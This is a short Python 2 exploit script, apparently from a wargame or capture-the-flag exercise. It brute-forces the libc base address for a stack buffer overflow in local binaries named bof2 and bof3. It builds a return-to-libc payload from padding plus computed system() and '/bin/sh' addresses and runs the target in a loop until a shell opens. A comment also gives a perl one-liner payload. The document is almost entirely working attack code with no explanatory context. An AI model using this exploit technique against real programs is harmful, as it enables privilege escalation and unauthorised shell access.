#!python
from struct import pack
import os
import sys

def p32(p):
    return pack('<I', p)

# ./bof2 $(perl -e 'print "A"x64 . "BBBBCCCCDDDD" . "\x60\x32\xe5\xb7" . "EEEE" .  "\x98\xbb\xf7\xb7"')

st = 0xb7500000
en = 0xb7f00000
SYSTEM = 0x00041260 
BIN_SH = 0x169b98 

while 1:
    for i in range(st, en, 0x1000):
        payload  = "A"*64
        payload += "BBBBCCCCDDDD"
        payload += p32(i + SYSTEM)
        payload += 'EEEE'
        payload += p32(i + BIN_SH)

        print "paylaod: %s" % repr(payload)
        open('output', 'wb').write(payload)
        os.system('./bof3 `cat output`')

